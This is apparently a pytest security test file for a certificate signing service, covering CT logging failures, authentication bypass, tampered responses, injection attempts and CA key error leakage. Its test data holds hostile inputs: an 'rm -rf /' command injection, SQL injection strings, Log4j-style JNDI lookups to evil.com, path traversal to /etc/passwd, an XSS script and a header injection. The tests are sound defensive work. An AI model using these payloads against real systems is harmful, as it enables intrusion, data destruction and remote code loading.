"""
Cross-service security tests for Signing Service interactions.

Tests service-to-service authentication, CT logging failures,
and inter-service attack scenarios.
"""

import pytest
import json
from unittest.mock import patch, Mock, MagicMock
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519

from app import create_app
from app.utils.certtransparency_client import CTLogError


class TestServiceIntegrationSecurity:
    """Cross-service security tests."""

    @pytest.fixture
    def app(self):
        """Create application for testing."""
        app = create_app()
        app.config['TESTING'] = True
        app.config['SIGNING_SERVICE_API_SECRET'] = 'test-api-secret'
        app.config['CT_SERVICE_API_SECRET'] = 'test-ct-secret'
        return app

    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return app.test_client()

    @pytest.fixture
    def valid_csr_pem(self):
        """Generate valid CSR for testing."""
        client_key = ed25519.Ed25519PrivateKey.generate()
        csr = x509.CertificateSigningRequestBuilder().subject_name(
            x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "test.example.com")])
        ).sign(client_key, None)
        return csr.public_bytes(serialization.Encoding.PEM).decode('utf-8')

    @patch('app.routes.api.v1.load_intermediate_ca')
    @patch('app.routes.api.v1.sign_csr')
    def test_ct_service_unavailable_signing_behavior(self, mock_sign, mock_load_ca, client, valid_csr_pem):
        """Test signing service behavior when CT logging fails - Blue Team resilience."""
        # Mock CA and signing
        mock_cert = Mock()
        mock_subject_attr = Mock()
        mock_subject_attr.value = 'test.example.com'
        mock_cert.subject.get_attributes_for_oid.return_value = [mock_subject_attr]
        mock_cert.public_bytes.return_value = b'-----BEGIN CERTIFICATE-----\nmock-cert\n-----END CERTIFICATE-----'
        mock_cert.subject.rfc4514_string.return_value = 'CN=test.example.com'
        mock_sign.return_value = mock_cert
        mock_load_ca.return_value = (Mock(), Mock())

        # Test various CT service failure scenarios
        ct_failure_scenarios = [
            CTLogError("CT service unavailable"),
            ConnectionError("Connection refused"),
            TimeoutError("Request timeout"),
            Exception("Generic CT error")
        ]

        for error in ct_failure_scenarios:
            with patch('app.routes.api.v1.log_certificate_to_ct', side_effect=error):
                response = client.post('/api/v1/sign-csr',
                                     json={'csr': valid_csr_pem, 'user_id': 'test'},
                                     headers={'Authorization': 'Bearer test-api-secret'})

                # Should still issue certificate even if CT logging fails
                assert response.status_code == 200, f"Should succeed despite CT failure: {error}"

                data = response.get_json()
                assert 'certificate' in data
                # API only returns certificate, not chain

    @patch('app.routes.api.v1.load_intermediate_ca')
    @patch('app.routes.api.v1.sign_csr')
    def test_ct_service_authentication_bypass(self, mock_sign, mock_load_ca, client, valid_csr_pem):
        """Test CT service authentication bypass attempts - Red Team attack."""
        # Mock CA and signing
        mock_cert = Mock()
        mock_subject_attr = Mock()
        mock_subject_attr.value = 'test.example.com'
        mock_cert.subject.get_attributes_for_oid.return_value = [mock_subject_attr]
        mock_cert.public_bytes.return_value = b'mock-cert-data'
        mock_cert.subject.rfc4514_string.return_value = 'CN=test.example.com'
        mock_sign.return_value = mock_cert
        mock_load_ca.return_value = (Mock(), Mock())

        # Mock CT client to simulate authentication bypass attempts
        with patch('app.utils.certtransparency_client.CTLogClient') as mock_ct_class:
            mock_ct_instance = Mock()
            mock_ct_class.return_value = mock_ct_instance

            # Test scenarios where CT authentication might be bypassed
            bypass_scenarios = [
                None,  # No API secret
                '',    # Empty API secret
                'wrong-secret',  # Wrong secret
            ]

            for secret in bypass_scenarios:
                # Mock the CT client with the wrong/missing secret
                mock_ct_instance.api_secret = secret

                if secret is None or secret == '':
                    # Should raise CTLogError for missing/empty secret
                    mock_ct_instance.log_certificate.side_effect = CTLogError("CT service API secret not configured")
                else:
                    # Should raise CTLogError for wrong secret (simulating 401 from CT service)
                    mock_ct_instance.log_certificate.side_effect = CTLogError("Unauthorized")

                response = client.post('/api/v1/sign-csr',
                                     json={'csr': valid_csr_pem, 'user_id': 'test'},
                                     headers={'Authorization': 'Bearer test-api-secret'})

                # Should still complete certificate signing (CT failure is logged but not fatal)
                assert response.status_code == 200, f"Should handle CT auth failure gracefully: {secret}"

    @patch('app.routes.api.v1.load_intermediate_ca')
    @patch('app.routes.api.v1.sign_csr')
    def test_ct_service_response_tampering(self, mock_sign, mock_load_ca, client, valid_csr_pem):
        """Test CT service response tampering detection - Blue Team integrity."""
        # Mock CA and signing
        mock_cert = Mock()
        mock_subject_attr = Mock()
        mock_subject_attr.value = 'test.example.com'
        mock_cert.subject.get_attributes_for_oid.return_value = [mock_subject_attr]
        mock_cert.public_bytes.return_value = b'mock-cert-data'
        mock_cert.subject.rfc4514_string.return_value = 'CN=test.example.com'
        mock_sign.return_value = mock_cert
        mock_load_ca.return_value = (Mock(), Mock())

        # Test tampered CT responses
        tampered_responses = [
            None,  # Null response
            {},    # Empty response
            {'status': 'logged', 'certificate': None},  # Missing certificate data
            {'status': 'failed'},  # Failed status
            {'certificate': {'fingerprint_sha256': 'wrong-fingerprint'}},  # Wrong fingerprint
            {'error': 'internal_error'},  # Error response
        ]

        for tampered_response in tampered_responses:
            with patch('app.routes.api.v1.log_certificate_to_ct', return_value=tampered_response):
                response = client.post('/api/v1/sign-csr',
                                     json={'csr': valid_csr_pem, 'user_id': 'test'},
                                     headers={'Authorization': 'Bearer test-api-secret'})

                # Should handle tampered responses gracefully
                assert response.status_code == 200, f"Should handle tampered CT response: {tampered_response}"

    def test_service_authentication_token_security(self, client, valid_csr_pem):
        """Test service authentication token security - Red Team crypto attacks."""
        # Test various token manipulation attacks
        # Test tokens that should be rejected by authentication
        safe_token_attacks = [
            'Bearer test-api-secret\x00admin',  # Null byte injection
            'Bearer ' + 'A' * 10000,  # Token length attack
            'Bearer test-api-secret; rm -rf /',  # Command injection attempt
            'Bearer test-api-secret\'; DROP TABLE certificates; --',  # SQL injection attempt
            'Bearer ${jndi:ldap://evil.com/}',  # Log4j style injection
            'Bearer ../../../etc/passwd',  # Path traversal
        ]

        for malicious_token in safe_token_attacks:
            response = client.post('/api/v1/sign-csr',
                                 json={'csr': valid_csr_pem, 'user_id': 'test'},
                                 headers={'Authorization': malicious_token})

            # Should reject all malicious tokens
            assert response.status_code == 401, f"Should reject malicious token: {malicious_token}"

        # Test header injection separately (Werkzeug properly rejects newlines)
        try:
            response = client.post('/api/v1/sign-csr',
                                 json={'csr': valid_csr_pem, 'user_id': 'test'},
                                 headers={'Authorization': 'Bearer test-api-secret\r\nX-Admin: true'})
            assert response.status_code == 401, "Header injection should be denied"
        except ValueError as e:
            # Werkzeug properly rejects newline characters - this is good security
            assert "newline characters" in str(e), "Should reject headers with newlines"

    @patch('app.routes.api.v1.load_intermediate_ca')
    @patch('app.routes.api.v1.sign_csr')
    def test_certificate_logging_injection_attacks(self, mock_sign, mock_load_ca, client, valid_csr_pem):
        """Test injection attacks via certificate logging data - Red Team attack."""
        # Mock CA and signing
        mock_cert = Mock()
        mock_subject_attr = Mock()
        mock_subject_attr.value = 'test.example.com'
        mock_cert.subject.get_attributes_for_oid.return_value = [mock_subject_attr]
        mock_cert.public_bytes.return_value = b'mock-cert-data'
        mock_cert.subject.rfc4514_string.return_value = 'CN=test.example.com'
        mock_sign.return_value = mock_cert
        mock_load_ca.return_value = (Mock(), Mock())

        # Test injection attempts via metadata fields
        injection_payloads = [
            {'user_email': "test'; DROP TABLE logs; --"},
            {'browser': '<script>alert("xss")</script>'},
            {'os_version': '${jndi:ldap://evil.com/}'},
            {'user_agent': '\x00\x01\x02admin'},
            {'request_timestamp': "'; UNION SELECT password FROM users; --"},
        ]

        for payload in injection_payloads:
            with patch('app.routes.api.v1.log_certificate_to_ct') as mock_log_ct:
                mock_log_ct.return_value = {'status': 'logged'}

                response = client.post('/api/v1/sign-csr',
                                     json={
                                         'csr': valid_csr_pem,
                                         'user_id': 'test',
                                         'request_metadata': payload
                                     },
                                     headers={'Authorization': 'Bearer test-api-secret'})

                assert response.status_code == 200, f"Should handle injection payload safely: {payload}"

                # Verify CT logging was called with sanitized data
                assert mock_log_ct.called, "CT logging should be called"
                call_args = mock_log_ct.call_args[1]

                # Metadata should be passed through but CT service should sanitize
                assert 'requester_info' in call_args
                requester_info = call_args['requester_info']

                # Basic validation that payload was included (sanitization is CT service responsibility)
                for key in payload.keys():
                    if key in requester_info:
                        # Values should be strings, not executed code
                        assert isinstance(requester_info[key], str)

    def test_ca_key_loading_security(self, client, valid_csr_pem):
        """Test CA key loading security - Blue Team key protection."""
        # Test CA loading failure scenarios
        ca_loading_errors = [
            (FileNotFoundError("CA key file not found"), 500),
            (PermissionError("Permission denied accessing CA key"), 500),
            (ValueError("Invalid CA key format"), 400),  # ValueError handled as 400
            (Exception("CA key decryption failed"), 500),
        ]

        for error, expected_status in ca_loading_errors:
            with patch('app.routes.api.v1.load_intermediate_ca', side_effect=error):
                response = client.post('/api/v1/sign-csr',
                                     json={'csr': valid_csr_pem, 'user_id': 'test'},
                                     headers={'Authorization': 'Bearer test-api-secret'})

                # Should fail securely without exposing CA key details
                assert response.status_code == expected_status, f"Should fail securely for CA error: {error}"

                response_text = response.get_data(as_text=True)

                # Should not expose sensitive CA information
                sensitive_terms = [
                    'key_file',
                    'private_key',
                    'passphrase',
                    'certificate_authority',
                    'ca.key',
                    'intermediate.key',
                    '/path/to/',
                    'permission',
                    'not found',
                    'traceback'
                ]

                for term in sensitive_terms:
                    assert term.lower() not in response_text.lower(), f"Should not expose: {term}"

    @patch('app.routes.api.v1.load_intermediate_ca')
    @patch('app.routes.api.v1.sign_csr')
    def test_concurrent_ct_logging_race_conditions(self, mock_sign, mock_load_ca, client, valid_csr_pem):
        """Test concurrent CT logging for race conditions - Blue Team concurrency."""
        import threading
        import time

        # Mock CA and signing
        mock_cert = Mock()
        mock_subject_attr = Mock()
        mock_subject_attr.value = 'test.example.com'
        mock_cert.subject.get_attributes_for_oid.return_value = [mock_subject_attr]
        mock_cert.public_bytes.return_value = b'mock-cert-data'
        mock_cert.subject.rfc4514_string.return_value = 'CN=test.example.com'
        mock_sign.return_value = mock_cert
        mock_load_ca.return_value = (Mock(), Mock())

        ct_call_times = []
        ct_call_count = 0

        def mock_ct_logging(*args, **kwargs):
            nonlocal ct_call_count
            ct_call_count += 1
            call_time = time.time()
            ct_call_times.append(call_time)

            # Simulate some processing time
            time.sleep(0.01)

            return {'status': 'logged', 'call_id': ct_call_count}

        results = []
        errors = []

        def make_request():
            try:
                with patch('app.routes.api.v1.log_certificate_to_ct', side_effect=mock_ct_logging):
                    response = client.post('/api/v1/sign-csr',
                                         json={'csr': valid_csr_pem, 'user_id': f'user_{threading.current_thread().ident}'},
                                         headers={'Authorization': 'Bearer test-api-secret'})
                    results.append(response.status_code)
            except Exception as e:
                errors.append(str(e))

        # Create concurrent requests
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)

        # Start all threads simultaneously
        for thread in threads:
            thread.start()

        # Wait for completion
        for thread in threads:
            thread.join()

        # Verify no race conditions occurred
        assert len(errors) == 0, f"Race condition errors: {errors}"
        assert len(results) == 10, "All requests should complete"
        assert all(status == 200 for status in results), "All requests should succeed"

        # Verify CT logging was called for each request
        assert ct_call_count == 10, f"CT logging should be called 10 times, got {ct_call_count}"